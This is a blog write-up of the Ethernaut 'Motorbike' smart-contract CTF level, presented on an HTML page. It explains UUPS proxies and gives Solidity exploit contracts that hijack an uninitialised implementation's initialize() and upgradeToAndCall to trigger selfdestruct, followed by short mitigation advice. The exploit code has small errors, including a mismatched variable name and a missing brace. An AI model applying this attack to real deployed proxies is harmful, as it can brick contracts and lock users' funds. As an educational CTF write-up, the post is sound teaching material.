<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Bad Proxies" /><meta name="author" content="Vishvesh" /><meta property="og:locale" content="en" /><meta name="description" content="A minimal, portfolio, sidebar, bootstrap Jekyll theme with responsive web design and focuses on text presentation." /><meta property="og:description" content="A minimal, portfolio, sidebar, bootstrap Jekyll theme with responsive web design and focuses on text presentation." /><link rel="canonical" href="https://vishvesh-rao.github.io/posts/Bad-Proxies/" /><meta property="og:url" content="https://vishvesh-rao.github.io/posts/Bad-Proxies/" /><meta property="og:site_name" content="Stryd3r" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-06T20:30:06+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bad Proxies" /><meta name="twitter:site" content="@The_Str1d3r" /><meta name="twitter:creator" content="@Vishvesh" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Vishvesh"},"description":"A minimal, portfolio, sidebar, bootstrap Jekyll theme with responsive web design and focuses on text presentation.","url":"https://vishvesh-rao.github.io/posts/Bad-Proxies/","@type":"BlogPosting","headline":"Bad Proxies","dateModified":"2022-11-06T20:30:06+08:00","datePublished":"2022-11-06T20:30:06+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://vishvesh-rao.github.io/posts/Bad-Proxies/"},"@context":"https://schema.org"}</script><title>Bad Proxies | Stryd3r</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stryd3r"><meta name="application-name" content="Stryd3r"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://codimd.s3.shivering-isles.com/demo/uploads/02a6da1fb9d19367162f423a3.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stryd3r</a></div><div class="site-subtitle font-italic">~Vishvesh, 21.y.o ~Blockchain security ~@team bi0s</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-user-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/presentations/" class="nav-link"> <i class="fa-fw fas fa-play ml-xl-3 mr-xl-3 unloaded"></i> <span>TALKS/PRESENTATIONS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/resume/" class="nav-link"> <i class="fa-fw fas fa-folder fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>RESUME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/Vishvesh-rao" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/The_Str1d3r" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['vishveshsrao','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Bad Proxies</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bad Proxies</h1><div class="post-meta text-muted"><div> By <em> <a href="https://www.linkedin.com/in/vishvesh-rao-847368191">Vishvesh_R</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-11-06 20:30:06 +0800" data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 6, 2022, 8:30 PM +0800" >Nov 6, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1114 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><html><head> <script type="text/javascript" async="" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"> </script> <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS_HTML"> MathJax.Hub.Config({ "HTML-CSS": { availableFonts: ["TeX"], }, tex2jax: { inlineMath: [['$','$'],["\\(","\\)"]]}, displayMath: [ ['$$','$$'], ['\[','\]'] ], TeX: { extensions: ["AMSmath.js", "AMSsymbols.js", "color.js"], equationNumbers: { autoNumber: "AMS" } }, showProcessingMessages: false, messageStyle: "none", imageFont: null, "AssistiveMML": { disabled: true } }); </script><hr /><h1 id="motorbike">Motorbike</h1><h2 id="overview">Overview<a href="#overview" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This challenge requires some pre requisites regarding upgradable smart contracts and differentmethods used to achieve this.</p><p>This challenge is based on the <em><strong>uups</strong> (Universal Upgradeable Proxy Standard)</em> upgradeable pattern in this instead of the proxy contract containing the upgradable logic the implementaion contract itself has the upgrading logic coded into it.</p><p>Another unique feature of this pattern is the security it provides agains storage collision. To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is typically saved in a specific storage slot (for example <code class="language-plaintext highlighter-rouge">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>) guaranteed to be never allocated by a compiler.</p><p>We can see this defined in the challenge contract. In our case the proxy contract is the <code class="language-plaintext highlighter-rouge">Motorbike</code> contract and the Engine contract is the implementation contract.</p><p>Now our goal is basically to call <code class="language-plaintext highlighter-rouge">selfdestruct()</code> on the implementation thereby making the proxy unusable.</p><h2 id="analysing-contracts">Analysing Contracts<a href="#analysing-contracts" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now lets have a lok at the implementaion contract…</p><h3 id="engine">Engine<a href="#engine" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="k">contract</span> <span class="n">Engine</span> <span class="k">is</span> <span class="n">Initializable</span> <span class="p">{</span>
    <span class="c1">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span>    <span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

    <span class="kt">address</span> <span class="k">public</span> <span class="n">upgrader</span><span class="p">;</span>
    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">horsePower</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">AddressSlot</span> <span class="p">{</span>
        <span class="kt">address</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">initialize</span><span class="p">()</span> <span class="k">external</span> <span class="n">initializer</span> <span class="p">{</span>
        <span class="n">horsePower</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
        <span class="n">upgrader</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Upgrade the implementation of the proxy to `newImplementation`
</span>    <span class="c1">// subsequently execute the function call
</span>    <span class="k">function</span> <span class="n">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
        <span class="n">_authorizeUpgrade</span><span class="p">();</span>
        <span class="n">_upgradeToAndCall</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Restrict to upgrader role
</span>    <span class="k">function</span> <span class="n">_authorizeUpgrade</span><span class="p">()</span> <span class="k">internal</span> <span class="k">view</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">upgrader</span><span class="p">,</span> <span class="s">"Can't upgrade"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
</span>    <span class="k">function</span> <span class="n">_upgradeToAndCall</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span>
    <span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
        <span class="c1">// Initial upgrade and setup call
</span>        <span class="n">_setImplementation</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">newImplementation</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Call failed"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="c1">// Stores a new address in the EIP1967 implementation slot.
</span>    <span class="k">function</span> <span class="n">_setImplementation</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">),</span> <span class="s">"ERC1967: new implementation is not a contract"</span><span class="p">);</span>
        
        <span class="n">AddressSlot</span> <span class="k">storage</span> <span class="n">r</span><span class="p">;</span>
        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">r_slot</span> <span class="o">:=</span> <span class="n">_IMPLEMENTATION_SLOT</span>
        <span class="p">}</span>
        <span class="n">r</span><span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="n">newImplementation</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This contract has no way to call the <code class="language-plaintext highlighter-rouge">selfdestruct()</code> function in it. In order to call it we will have to declare our own implementaion with the function declared in it.</p><p>To do that we will need to update the implementation contract to ours. Looking at <code class="language-plaintext highlighter-rouge">Engine</code> we can see there is a fucntion to do just that: <code class="language-plaintext highlighter-rouge">upgradeToAndCall()</code>.</p><p>This function calls the ` _authorizeUpgrade()` function inside it which chekcs to see if we have the necessary authentication to change implementation contracts address. Only if we are the <strong><em>upgrader</em></strong> can we change the address.</p><p>So how is the <strong><em>upgrader</em></strong> address determined..? The address which calls the <code class="language-plaintext highlighter-rouge">initialize()</code> function becomes the <strong><em>upgrader</em></strong> , this is meant to be called by the proxy contract.</p><p>Lets have a look at the proxy contract….</p><h3 id="motorbike-1">Motorbike<a href="#motorbike-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="k">contract</span> <span class="n">Motorbike</span> <span class="p">{</span>
    <span class="c1">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span>    <span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
    
    <span class="k">struct</span> <span class="n">AddressSlot</span> <span class="p">{</span>
        <span class="kt">address</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
</span>    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_logic</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">_logic</span><span class="p">),</span> <span class="s">"ERC1967: new implementation is not a contract"</span><span class="p">);</span>
        <span class="n">_getAddressSlot</span><span class="p">(</span><span class="n">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="n">value</span> <span class="o">=</span> <span class="n">_logic</span><span class="p">;</span>
        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">_logic</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span>
            <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"initialize()"</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Call failed"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Delegates the current call to `implementation`.
</span>    <span class="k">function</span> <span class="n">_delegate</span><span class="p">(</span><span class="kt">address</span> <span class="n">implementation</span><span class="p">)</span> <span class="k">internal</span> <span class="k">virtual</span> <span class="p">{</span>
        <span class="c1">// solhint-disable-next-line no-inline-assembly
</span>        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">calldatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">calldatasize</span><span class="p">())</span>
            <span class="kr">let</span> <span class="n">result</span> <span class="o">:=</span> <span class="nb">delegatecall</span><span class="p">(</span><span class="n">gas</span><span class="p">(),</span> <span class="n">implementation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">calldatasize</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">returndatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span>
            <span class="kr">switch</span> <span class="n">result</span>
            <span class="kr">case</span> <span class="mi">0</span> <span class="p">{</span> <span class="nb">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span> <span class="p">}</span>
            <span class="kr">default</span> <span class="p">{</span> <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span> <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. 
</span>    <span class="c1">// Will run if no other function in the contract matches the call data
</span>    <span class="k">fallback</span> <span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">virtual</span> <span class="p">{</span>
        <span class="n">_delegate</span><span class="p">(</span><span class="n">_getAddressSlot</span><span class="p">(</span><span class="n">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="n">value</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.
</span>    <span class="k">function</span> <span class="n">_getAddressSlot</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">slot</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="n">AddressSlot</span> <span class="k">storage</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">r_slot</span> <span class="o">:=</span> <span class="n">slot</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Here we can see that proxy contract indeed calls the initialize function and as we knoe the intilaize function can only be called once.</p><p>So if are to become the upgrader we would have to somehow call the <code class="language-plaintext highlighter-rouge">intialize()</code> function and it should be the first time its being called.</p><p>So how do we go about this…</p><h2 id="constructing-the-exploit">Constructing the exploit<a href="#constructing-the-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>What we need to understand here is that</p><ul><li>The intialize() function has no access control and anyone is free to call it as long as two things are satisfied..<ul><li>We need the address of the current implementaion contract so that we can call intialize() on it.<li>We should be the first one to call intialize()</ul></ul><p>The first problem to get the address, we know the address is stored at the above mentioned storage location so we just input the following query into the console..</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="dl">'</span><span class="p">)</span>
</pre></table></code></div></div><p>Now regarding the second problem, the proxy contract would have already called the <code class="language-plaintext highlighter-rouge">initialize()</code> function when it was deployed so how that means its been already called and we cant call it now ryt…?</p><p>Well looking closely at the <code class="language-plaintext highlighter-rouge">Mototrbike</code> contract we see that its constructor performs a delegatecall on <code class="language-plaintext highlighter-rouge">Engine</code> to call <code class="language-plaintext highlighter-rouge">intialize(</code>) this means that what ever storage variable change it changes in the context of the proxy contract and not that of the implementaion, including the variable which keeps track of if <code class="language-plaintext highlighter-rouge">intialze()</code> has been called or not.</p><p>So in the context of Engine <code class="language-plaintext highlighter-rouge">intialize()</code> has never been called and so a simple call to it from our <code class="language-plaintext highlighter-rouge">Attack</code> contract will make our contract the upgrader and then we just need to load the address of our custom implementation contract containing the <code class="language-plaintext highlighter-rouge">selfdestruct()</code> fucntion, which we can then call.</p><h2 id="exploit">Exploit<a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We will need two contracts..</p><h3 id="custom-implementation-contract">Custom Implementation contract..<a href="#custom-implementation-contract" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">contract</span> <span class="n">SelfDestruct</span> <span class="p">{</span>
    
    <span class="k">function</span> <span class="n">exploit</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
        <span class="nb">selfdestruct</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
    <span class="p">}</span>
</pre></table></code></div></div><h3 id="the-exploit-contract">The exploit contract…<a href="#the-exploit-contract" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: MIT
</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">contract</span> <span class="n">Attack</span><span class="p">{</span>
    
    <span class="n">Engine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">Engine</span><span class="p">(</span><span class="n">_EngineAddress</span><span class="p">);</span>
    
    <span class="k">function</span> <span class="n">upgrade</span><span class="p">()</span> <span class="k">external</span><span class="p">{</span>
        
        <span class="n">engineAddress</span><span class="p">.</span><span class="n">initialize</span><span class="p">();</span>
        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">encodedData</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"exploit()"</span><span class="p">);</span>
        <span class="n">engineAddress</span><span class="p">.</span><span class="n">upgradeToAndCall</span><span class="p">(</span><span class="n">_selfDestrucAddress</span><span class="p">,</span> <span class="n">encodedData</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="mitigation">Mitigation<a href="#mitigation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Make sure to guard sensetive and application critical function with access modifiers.<li>Always be mindfull of the context in which a fucntion is being called and where the state variables are stored and modified.</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blockchain/'>Blockchain</a>, <a href='/categories/ctf-writeups/'>CTF-Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ethereum/" class="post-tag no-text-decoration" >Ethereum</a> <a href="/tags/solidity/" class="post-tag no-text-decoration" >Solidity</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bad Proxies - Stryd3r&url=https://vishvesh-rao.github.io/posts/Bad-Proxies/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bad Proxies - Stryd3r&u=https://vishvesh-rao.github.io/posts/Bad-Proxies/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Bad Proxies - Stryd3r&url=https://vishvesh-rao.github.io/posts/Bad-Proxies/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/STABLEMAGNET-RUGPULL/">STABLEMAGNET SWAP - ANALYSIS OF A RUGPULL</a><li><a href="/posts/Ankr-aBNBc-Token-Exploit/">Ankr aBNBc Token Exploit</a><li><a href="/posts/How-Not-To-Use-Custom-Errors/">How Not To Use Custom Errors</a><li><a href="/posts/Ethernaut-CTF-Writeups-Part-1/">Ethernaut CTF Writeups - Part 1</a><li><a href="/posts/Ethernaut-CTF-Writeups-Part-2/">Ethernaut CTF Writeups - Part 2</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ethereum/">Ethereum</a> <a class="post-tag" href="/tags/solidity/">Solidity</a> <a class="post-tag" href="/tags/crypto/">Crypto</a> <a 